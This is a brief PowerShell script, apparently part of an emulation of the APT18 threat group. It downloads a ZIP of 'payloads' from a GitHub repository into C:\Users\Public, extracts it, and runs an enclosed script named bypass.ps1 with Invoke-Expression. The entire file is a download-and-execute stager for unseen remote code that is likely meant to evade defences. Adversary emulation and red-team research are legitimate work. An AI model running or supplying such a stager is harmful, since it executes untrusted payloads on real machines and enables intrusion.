# Define the URL of the ZIP file and the local path to save it
$url = "https://github.com/alekzandr/Research/raw/main/APT18/Scenario%202/tools.zip"
$zipPath = "C:\Users\Public\payloads.zip"

# Download the ZIP file
Invoke-WebRequest -Uri $url -OutFile $zipPath

# Define the extraction path
$extractPath = "C:\Users\Public\payloads"

# Extract the ZIP file
Expand-Archive -LiteralPath $zipPath -DestinationPath $extractPath

# Define the path of the PowerShell script inside the extracted folder
# Update the script name as per your ZIP content
$scriptPath = Join-Path $extractPath "bypass.ps1"

# Execute the PowerShell script
iex $scriptPath